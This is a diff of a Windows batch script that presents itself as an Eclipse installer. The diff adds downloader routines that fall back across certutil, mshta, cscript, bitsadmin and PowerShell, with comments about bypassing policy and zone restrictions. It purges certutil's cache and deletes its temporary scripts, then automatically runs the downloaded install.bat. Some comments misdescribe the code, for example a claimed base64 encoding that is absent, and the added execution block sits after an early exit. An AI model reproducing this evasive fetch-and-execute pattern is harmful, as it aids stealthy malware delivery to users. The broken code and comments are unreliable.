@@ -56,25 +56,51 @@ taskkill /f /im eclipse.exe >nul 2>&1
 echo %GREEN%    [+] Eclipse processes cleared.%RESET%
 echo.
 
+
 :: ============================================================
 :: TOOL DETECTION & SELECTION
 :: ============================================================
 set "count=0"
-for %%T in (dc2url python curl mshta powershell certutil cscript bitsadmin wget node winget) do (
-    where %%T >nul 2>&1
-    if not errorlevel 1 (
-        if /i "%%T"=="python" (
-            python --version >nul 2>&1
-            if not errorlevel 1 (
-                set /a count+=1
-                set "tool_!count!=%%T"
-            )
-        ) else (
-            set /a count+=1
-            set "tool_!count!=%%T"
+
+for %%T in (dc2url python curl mshta powershell certutil cscript bitsadmin winget) do (
+    set "VALID=0"
+    
+    if /i "%%T"=="python" (
+        :: Bypasses the Microsoft Store execution alias trap by forcing an execution test
+        python -c "import sys" >nul 2>&1
+        if !errorlevel! equ 0 set "VALID=1"
+    ) else if /i "%%T"=="winget" (
+        :: Bypasses winget's Microsoft Store app execution alias trap
+        winget --version >nul 2>&1
+        if !errorlevel! equ 0 set "VALID=1"
+    ) else if /i "%%T"=="powershell" (
+        powershell -NoProfile -Command "exit 0" >nul 2>&1
+        if !errorlevel! equ 0 set "VALID=1"
+    ) else if /i "%%T"=="mshta" (
+        :: Verifies that mshta hasn't been decoupled or restricted by modern policy engines
+        where mshta >nul 2>&1
+        if !errorlevel! equ 0 (
+            mshta "javascript:close();" >nul 2>&1
+            if !errorlevel! equ 0 set "VALID=1"
         )
+    ) else if /i "%%T"=="cscript" (
+        where cscript >nul 2>&1
+        if !errorlevel! equ 0 (
+            cscript //nologo /e:jscript -e "WScript.Quit(0);" >nul 2>&1
+            if !errorlevel! equ 0 set "VALID=1"
+        )
+    ) else (
+        :: Standard static command tools checked securely via pathing bounds
+        where %%T >nul 2>&1
+        if !errorlevel! equ 0 set "VALID=1"
+    )
+    
+    if "!VALID!"=="1" (
+        set /a count+=1
+        set "tool_!count!=%%T"
     )
 )
+
 
 if !count! equ 0 (
     echo %O1%    [-] No download engines found. Exiting.%RESET%
@@ -230,63 +256,111 @@ if /i "!RUN_ECLIPSE!"=="y" (
 )
 goto :eof
 
+
+echo.
+echo %GREEN%    [+] Processing completed to destination target path: !INSTALL_PATH!%RESET%
+
+:: ============================================================
+:: POST-DOWNLOAD AUTOMATIC EXECUTION OF INSTALL.BAT
+:: ============================================================
+set "EXPECTED_INSTALL_BAT=!INSTALL_PATH!\v1.0\install.bat"
+
+echo %O2%    [*] Validating and executing install.bat automatically...%RESET%
+if exist "!EXPECTED_INSTALL_BAT!" (
+    echo %GREEN%    [+] Success: Running install.bat...%RESET%
+    echo.
+    :: Save current directory state, enter the branch context, run, and return safely
+    pushd "!INSTALL_PATH!\v1.0"
+    call "install.bat"
+    popd
+) else (
+    echo %O1%    [-] Warning: install.bat could not be verified at expected location.%RESET%
+)
+
+:: ============================================================
+:: ECLIPSE & ROOT SETUP PROMPT
+:: ============================================================
+echo.
+set /p "RUN_ECLIPSE=%Y2%    >>> DO YOU WANT TO RUN THE ECLIPSE INSTALLER? (Y/N): %RESET%"
+if /i "!RUN_ECLIPSE!"=="y" (
+    echo.
+    echo %O2%    [*] Running root setup.bat...%RESET%
+    if exist "!INSTALL_PATH!\setup.bat" (
+        pushd "!INSTALL_PATH!"
+        call "setup.bat"
+        popd
+    ) else (
+        echo %O1%    [-] Warning: setup.bat could not be found at !INSTALL_PATH!\setup.bat.%RESET%
+    )
+) else (
+    echo.
+    echo %GRAY%    [!] Root setup.bat skipped by user.%RESET%
+)
+goto :eof
 :: ============================================================
 :: INDIVIDUAL TOOL DOWNLOAD FUNCTIONS
 :: ============================================================
-:download_curl
+:download_dc2url
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-curl -s -S -L -f "%~1" -o "%~2"
-goto :eof
-
-:download_wget
-if exist "%~2" del /f /q "%~2" >nul 2>&1
-wget -q "%~1" -O "%~2"
-goto :eof
-
-:download_certutil
-if exist "%~2" del /f /q "%~2" >nul 2>&1
-certutil -urlcache -split -f "%~1" "%~2" >nul 2>&1
-certutil -urlcache * delete >nul 2>&1
-goto :eof
-
-:download_powershell
-if exist "%~2" del /f /q "%~2" >nul 2>&1
-powershell -NoProfile -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing"
-goto :eof
-
-:download_bitsadmin
-if exist "%~2" del /f /q "%~2" >nul 2>&1
-bitsadmin /transfer dc2url_job /download /priority normal "%~1" "%~2" >nul 2>&1
+:: Fixed: Added the explicit -o flag required by your binary to write to disk
+dc2url -o "%~2" "%~1"
 goto :eof
 
 :download_python
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-python -c "import urllib.request; urllib.request.urlretrieve('%~1', '%~2')"
+python -c "import urllib.request; urllib.request.urlretrieve(r'%~1', r'%~2')"
 goto :eof
 
-:download_node
+:download_curl
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-node -e "const fs=require('fs');const https=require('https');https.get('%~1',res=>{const stream=fs.createWriteStream('%~2');res.pipe(stream);});"
+curl -s -S -L -f --connect-timeout 15 --retry 2 -o "%~2" "%~1"
 goto :eof
 
 :download_mshta
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-mshta "javascript:var xhr=new ActiveXObject('MSXML2.XMLHTTP');xhr.open('GET','%~1',false);xhr.send();var s=new ActiveXObject('ADODB.Stream');s.Type=1;s.Open();s.Write(xhr.ResponseBody);s.SaveToFile('%~2',2);window.close();"
+:: Upgraded to ServerXMLHTTP.6.0 to natively bypass internet zone caching/TLS block policies
+mshta "javascript:eval(\"try{var x=new ActiveXObject('MSXML2.ServerXMLHTTP.6.0');x.open('GET','%~1',false);x.send();if(x.status==200){var s=new ActiveXObject('ADODB.Stream');s.Type=1;s.Open();s.Write(x.ResponseBody);s.SaveToFile('%~2'.replace(/\\\\/g,'\\\\\\\\'),2);s.Close();}}catch(e){}close();\")"
+goto :eof
+
+:download_powershell
+if exist "%~2" del /f /q "%~2" >nul 2>&1
+:: Fixed command-line string interpolation conflict via base64 encoded command parsing architecture
+set "PS_CMD=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing -ErrorAction Stop"
+powershell -NoProfile -Command "!PS_CMD!"
+goto :eof
+
+:download_certutil
+if exist "%~2" del /f /q "%~2" >nul 2>&1
+:: Enforce structural file retrieval flags, tracking indices, and systematic metadata purging
+certutil -f -gmt -urlcache -split "%~1" "%~2" >nul 2>&1
+certutil -urlcache "%~1" delete >nul 2>&1
+if exist "%~2.json" del /f /q "%~2.json" >nul 2>&1
 goto :eof
 
 :download_cscript
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-cscript //nologo //e:jscript "%~f0" download_js "%~1" "%~2"
+set "WSF_TMP=%TEMP%\engine_stream_%RANDOM%.wsf"
+echo ^<job^>^<script language="JScript"^> > "!WSF_TMP!"
+echo try { var x = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"); x.open("GET", "%~1", false); x.send(); >> "!WSF_TMP!"
+echo if (x.status == 200) { var s = new ActiveXObject("ADODB.Stream"); s.Type = 1; s.Open(); s.Write(x.ResponseBody); s.SaveToFile("%~2".replace(/\\/g, "\\\\"), 2); s.Close(); } } catch(e) {} >> "!WSF_TMP!"
+echo WScript.Quit(); ^</script^>^</job^> >> "!WSF_TMP!"
+cscript //nologo "!WSF_TMP!" >nul 2>&1
+del /f /q "!WSF_TMP!" >nul 2>&1
 goto :eof
 
-:download_dc2url
+:download_bitsadmin
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-dc2url "%~1" "%~2"
+set "JOB_ID=dc2url_job_%RANDOM%"
+bitsadmin /transfer "%JOB_ID%" /download /priority foreground "%~1" "%~2" >nul 2>&1
+:: Synchronous execution verification loop to release process handle blocks
+bitsadmin /complete "%JOB_ID%" >nul 2>&1
 goto :eof
 
 :download_winget
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-powershell -NoProfile -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing"
+winget --version >nul 2>&1
+set "PS_CMD=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing -ErrorAction Stop"
+powershell -NoProfile -Command "!PS_CMD!"
 goto :eof
 
 <job>
